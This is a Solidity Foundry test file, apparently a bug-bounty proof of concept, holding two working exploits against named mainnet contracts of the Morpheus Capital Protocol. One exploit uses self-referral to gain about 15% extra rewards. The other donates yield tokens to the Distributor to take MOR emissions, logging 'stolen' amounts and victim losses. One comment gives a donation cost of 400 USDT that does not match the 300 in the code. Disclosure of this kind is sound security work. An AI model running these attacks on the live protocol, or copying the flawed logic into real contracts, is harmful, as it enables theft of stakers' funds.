// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface INoRet {
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IAggregatorV3 {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getLatestReferrerReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function referrersData(address, uint256) external view returns (uint256 amountStaked, uint256 virtualAmountStaked, uint256 rate, uint256 pendingRewards, uint128 lastClaim);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface ILido {
    function submit(address referral) external payable;
}

/**
 * Morpheus Capital Protocol (Ethereum mainnet) local-fork PoCs
 *
 * TARGET ADDRESSES (bug-bounty Appendix A):
 *   DepositPool (stETH)  0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790   (ERC1967 proxy)
 *   DepositPool (USDT)   0x3B51989212BEdaB926794D6bf8e9E991218cf116   (ERC1967 proxy)
 *   Distributor          0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A   (ERC1967 proxy)
 *   RewardPool           0xb7994dE339AEe515C9b2792831CD83f3C9D8df87   (ERC1967 proxy)
 *
 * ORACLE / YIELD SIMULATION NOTES:
 *  - Chainlink feeds are time-frozen on a fork. The tests warp forward past
 *    `allowedPriceUpdateDelay`, so `latestRoundData()` is mocked to return the
 *    exact real on-chain answers with a fresh `updatedAt` — simulating the
 *    oracle heartbeat that occurs naturally in production. No protocol state
 *    is mocked.
 *  - Aave/Lido yield does not accrue across `vm.warp` on a fork. To reproduce
 *    steady-state conditions, one day of REAL organic yield (measured from
 *    on-chain rates, see report) is credited to each pool's yield token in
 *    both compared runs, identically.
 *  - The attacker needs no privileges: no pranks of owner/admin/multisig.
 */
contract MorCapitalPoC is Test {
    // ---------------- Appendix A ----------------
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;

    // ---------------- externals ----------------
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant AUSDC = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
    address constant AWETH = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // prices read at the pinned block (see report)
    uint256 constant MOR_PRICE_E8 = 85_600_000; // $0.856 in E8

    address[] feeds;
    int256[] answers;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 26_321_432);
    }

    // ------------------------------------------------- feed freshness mocks
    function _loadFeeds() internal {
        if (feeds.length > 0) return;
        address[6] memory fs = [
            0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8, // stETH/USD
            0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23, // wBTC/BTC
            0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c, // BTC/USD
            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419, // wETH/USD
            0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6, // USDC/USD
            0x3E7d1eAB13ad0104d2750B8863b489D65364e32D // USDT/USD
        ];
        for (uint256 i = 0; i < fs.length; i++) {
            (, int256 ans,, uint256 upd,) = IAggregatorV3(fs[i]).latestRoundData();
            feeds.push(fs[i]);
            answers.push(ans);
            vm.mockCall(
                fs[i],
                abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
                abi.encode(uint80(1), ans, upd, block.timestamp, uint80(1))
            );
        }
    }

    function _refreshFeeds() internal {
        for (uint256 i = 0; i < feeds.length; i++) {
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
                abi.encode(uint80(1), answers[i], block.timestamp, block.timestamp, uint80(1))
            );
        }
    }

    function _warpToNextDistribution() internal {
        uint128 last = IDistributor(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(0);
        vm.warp(uint256(last) + 86_401);
        _refreshFeeds();
    }

    // ------------------------------------------------- helpers
    function _getStETH(address to, uint256 amount) internal {
        vm.deal(address(this), amount);
        ILido(STETH).submit{value: amount}(address(0));
        IERC20(STETH).transfer(to, IERC20(STETH).balanceOf(address(this)));
    }

    /// one day of real organic yield credited to each pool's yield token
    /// (steady-state rates measured on-chain; frozen fork can't accrue)
    function _simulateOneDayOrganicYield() internal {
        // stETH pool (NONE strategy): Lido rebase ~0.40 stETH/day on 4,839 stETH
        _getStETH(DISTRIBUTOR, 0.40 ether);
        // USDC pool (AAVE): ~36 USDC/day on 600k USDC
        deal(USDT, address(this), 0); // noop to keep stdStorage warm
        _aaveSupplyAndDonate(AUSDC, 36 * 1e6);
        // wETH pool (AAVE): ~1 USD/day
        _aaveSupplyAndDonate(AWETH, 0.00044 ether);
        // USDT pool (AAVE): ~0.40 USDT/day
        _aaveSupplyAndDonate(AUSDT, 0.40 * 1e6);
    }

    function _aaveSupplyAndDonate(address aToken, uint256 amt) internal {
        if (aToken == AUSDT) {
            deal(USDT, address(this), amt);
            INoRet(USDT).approve(AAVE_POOL, amt);
            IAavePool(AAVE_POOL).supply(USDT, amt, address(this), 0);
            IERC20(AUSDT).transfer(DISTRIBUTOR, IERC20(AUSDT).balanceOf(address(this)));
        } else if (aToken == AUSDC) {
            deal(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, address(this), amt);
            INoRet(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).approve(AAVE_POOL, amt);
            IAavePool(AAVE_POOL).supply(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, amt, address(this), 0);
            IERC20(AUSDC).transfer(DISTRIBUTOR, IERC20(AUSDC).balanceOf(address(this)));
        } else if (aToken == AWETH) {
            vm.deal(address(this), amt);
            (bool ok,) = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.call{value: amt}(abi.encodeWithSignature("deposit()"));
            require(ok, "weth wrap");
            INoRet(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(AAVE_POOL, amt);
            IAavePool(AAVE_POOL).supply(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, amt, address(this), 0);
            IERC20(AWETH).transfer(DISTRIBUTOR, IERC20(AWETH).balanceOf(address(this)));
        }
    }

    // ========================================================================
    // PoC 1 — Self-referral: free ~16% reward weight on own deposit
    // (DepositPool.stake / _applyReferrerTier / ReferrerLib — no referrer!=user check)
    // ========================================================================
    function test_PoC_SelfReferral_MintsExtraRewards() public {
        _loadFeeds();
        address attacker = makeAddr("attacker");
        address control = makeAddr("control");

        _getStETH(attacker, 1_000 ether);
        _getStETH(control, 1_000 ether);

        uint256 balA = IERC20(STETH).balanceOf(attacker);
        uint256 balC = IERC20(STETH).balanceOf(control);
        assertApproxEqAbs(balA, 1_000 ether, 10);
        assertApproxEqAbs(balC, 1_000 ether, 10);

        vm.startPrank(attacker);
        IERC20(STETH).approve(STETH_POOL, type(uint256).max);
        IERC20(STETH).approve(DISTRIBUTOR, type(uint256).max);
        IDepositPool(STETH_POOL).stake(0, balA, 0, attacker); // <-- referrer = SELF
        vm.stopPrank();

        vm.startPrank(control);
        IERC20(STETH).approve(STETH_POOL, type(uint256).max);
        IERC20(STETH).approve(DISTRIBUTOR, type(uint256).max);
        IDepositPool(STETH_POOL).stake(0, balC, 0, address(0));
        vm.stopPrank();

        (uint256 amountStaked, uint256 virtualStaked,,,) = IDepositPool(STETH_POOL).referrersData(attacker, 0);
        console2.log("self-referrer amountStaked (own deposit):", amountStaked);
        console2.log("self-referrer virtualStaked (15% tier):", virtualStaked);
        assertApproxEqAbs(amountStaked, balA, 10, "own deposit registered as own referral stake");
        assertApproxEqAbs(virtualStaked, balA * 15 / 100, 20, "tier-3 (15%) multiplier applied to own deposit");

        uint256 aUser0 = IDepositPool(STETH_POOL).getLatestUserReward(0, attacker);
        uint256 aRef0 = IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker);
        uint256 c0 = IDepositPool(STETH_POOL).getLatestUserReward(0, control);

        _warpToNextDistribution();
        IDistributor(DISTRIBUTOR).distributeRewards(0);

        uint256 attackerGain = IDepositPool(STETH_POOL).getLatestUserReward(0, attacker) - aUser0
            + IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker) - aRef0;
        uint256 controlGain = IDepositPool(STETH_POOL).getLatestUserReward(0, control) - c0;

        console2.log("--- one distribution period, identical 1,000 stETH stakes ---");
        console2.log("attacker MOR gained (user + own-referrer streams):", attackerGain);
        console2.log("control  MOR gained (no referrer):", controlGain);
        console2.log("attacker uplift (bps):", attackerGain * 10000 / controlGain - 10000);

        // INVARIANT BROKEN: identical stakes must earn identical rewards
        assertGt(attackerGain, controlGain, "self-referral over-earns");
        assertGt(attackerGain * 100, controlGain * 115, "boost >= 15%");
    }

    // ========================================================================
    // PoC 2 — Donated yield tokens buy MOR emission share
    // (DistributorV2.distributeRewards — yield = balanceOf(distributor) - lastUnderlyingBalance)
    // ========================================================================
    function test_PoC_YieldDonation_StealsEmissionShare() public {
        _loadFeeds();
        address attacker = makeAddr("attacker");
        address control = makeAddr("control"); // honest capital provider

        // attacker becomes dominant staker of the low-yield USDT pool
        deal(USDT, attacker, 1_200_000 * 1e6);
        vm.startPrank(attacker);
        INoRet(USDT).approve(USDT_POOL, type(uint256).max);
        INoRet(USDT).approve(DISTRIBUTOR, type(uint256).max);
        IDepositPool(USDT_POOL).stake(0, 500_000 * 1e6, 0, address(0));
        vm.stopPrank();

        // control: honest staker in the dominant (stETH) pool
        _getStETH(control, 1_000 ether);
        uint256 balC = IERC20(STETH).balanceOf(control);
        vm.startPrank(control);
        IERC20(STETH).approve(STETH_POOL, type(uint256).max);
        IERC20(STETH).approve(DISTRIBUTOR, type(uint256).max);
        IDepositPool(STETH_POOL).stake(0, balC, 0, address(0));
        vm.stopPrank();

        // steady-state organic yield, identical in both runs
        _simulateOneDayOrganicYield();

        // ============ RUN A: baseline (no attack) ============
        uint256 snap = vm.snapshotState();
        _warpToNextDistribution();
        uint256 a0 = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker);
        uint256 c0 = IDepositPool(STETH_POOL).getLatestUserReward(0, control);
        IDistributor(DISTRIBUTOR).distributeRewards(0);
        uint256 attackerNoDon = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker) - a0;
        uint256 controlNoDon = IDepositPool(STETH_POOL).getLatestUserReward(0, control) - c0;

        // ============ RUN B: attack ============
        vm.revertToState(snap);
        uint256 D = 300 * 1e6; // $300 aUSDT donated to the Distributor as fake "yield"
        vm.startPrank(attacker);
        INoRet(USDT).approve(AAVE_POOL, type(uint256).max);
        IAavePool(AAVE_POOL).supply(USDT, 500_000 * 1e6, attacker, 0);
        IERC20(AUSDT).transfer(DISTRIBUTOR, D); // <-- manufactured yield
        vm.stopPrank();

        _warpToNextDistribution();
        uint256 b0 = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker);
        uint256 d0 = IDepositPool(STETH_POOL).getLatestUserReward(0, control);
        IDistributor(DISTRIBUTOR).distributeRewards(0);
        uint256 attackerWithDon = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker) - b0;
        uint256 controlWithDon = IDepositPool(STETH_POOL).getLatestUserReward(0, control) - d0;

        uint256 stolen = attackerWithDon - attackerNoDon;
        uint256 victimLoss = controlNoDon - controlWithDon;

        console2.log("--- one distribution period (~1 day of MOR emission) ---");
        console2.log("attacker MOR gained WITHOUT donation:", attackerNoDon);
        console2.log("attacker MOR gained WITH donation:", attackerWithDon);
        console2.log("honest staker MOR gained WITHOUT donation:", controlNoDon);
        console2.log("honest staker MOR gained WITH donation:", controlWithDon);
        console2.log("STOLEN MOR (attacker over-accrual):", stolen);
        console2.log("VICTIM LOSS MOR (honest staker dilution):", victimLoss);

        // USD: stolen MOR (18 dec) * $0.856 vs donation cost 400 USDT (6 dec)
        uint256 stolenUsdE18 = stolen * MOR_PRICE_E8 / 1e8;
        console2.log("stolen value USD (18 dec):", stolenUsdE18);

        // attacker profit: value of over-accrued MOR exceeds the donation cost
        assertGt(stolenUsdE18, D * 1e12, "attacker profit: MOR gained in excess of donation cost");
        assertGt(victimLoss, 0, "honest stakers are diluted: loss of MOR emissions");
    }
}
